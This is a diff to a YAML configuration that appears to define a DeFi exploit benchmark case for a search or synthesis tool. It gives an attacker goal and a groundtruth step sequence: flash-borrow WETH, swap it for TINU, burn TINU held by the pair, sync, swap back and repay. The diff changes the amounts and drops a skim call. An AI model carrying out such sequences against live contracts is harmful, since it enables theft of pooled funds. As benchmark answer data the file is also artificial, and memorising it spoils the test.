@@ -18,7 +18,6 @@ ctrt_name2deploy:
 extra_actions:
   - "function burn_pair_tinu(uint256 amount) internal {
       tinu.deliver(address(pair), amount);
-      pair.skim(attacker);
     }"
 
 extra_deployments:
@@ -28,12 +27,12 @@ extra_constraints: []
 attack_goal: "weth.balanceOf(attacker) >= 1e18 + balanceOfwethattacker"
 
 groundtruth:
-  - ["borrow", "weth", "104.85e18"]
+  - ["borrow", "weth", "22e18"]
   - ["swap", "pair", "weth", "tinu", "weth.balanceOf(attacker)"]
-  - ["burn", "pair", "tinu", "tinu.balanceOf(address(pair)) - 1"]
+  - ["burn", "pair", "tinu", "100 ether"]
   - ["sync", "pair"]
   - ["swap", "pair", "tinu", "weth", "tinu.balanceOf(attacker)"]
-  - ["payback", "weth", "104.85e18 * 1003 / 1000"]
+  - ["payback", "weth", "22e18"]
 
 # Information for search space building.
 roles:
